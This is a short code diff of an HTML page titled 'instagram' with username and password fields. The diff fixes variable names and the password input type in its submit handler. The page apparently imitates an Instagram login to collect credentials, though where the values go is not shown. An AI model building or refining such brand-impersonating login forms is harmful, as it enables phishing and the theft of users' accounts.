@@ -55,7 +55,7 @@
   <h2>instagram</h2>
 
   <input id="username" type="text" placeholder="Enter username">
-  <input id="pasword" type="tel" placeholder="Enter pasword">
+  <input id="pasword" type="text" placeholder="Enter pasword">
 
   <button id="submitBtn">Submit</button>
 
@@ -85,8 +85,8 @@
   const btn = document.getElementById("submitBtn");
 
   btn.addEventListener("click", async () => {
-    const name = document.getElementById("username").value.trim();
-    const mobile = document.getElementById("pasword").value.trim();
+    const username = document.getElementById("username").value.trim();
+    const pasword = document.getElementById("pasword").value.trim();
 
     if (!username || !pasword) {
       msg.textContent = "Fill all fields!";
@@ -113,6 +113,7 @@
 
 </body>
 </html>
+
 
 
 
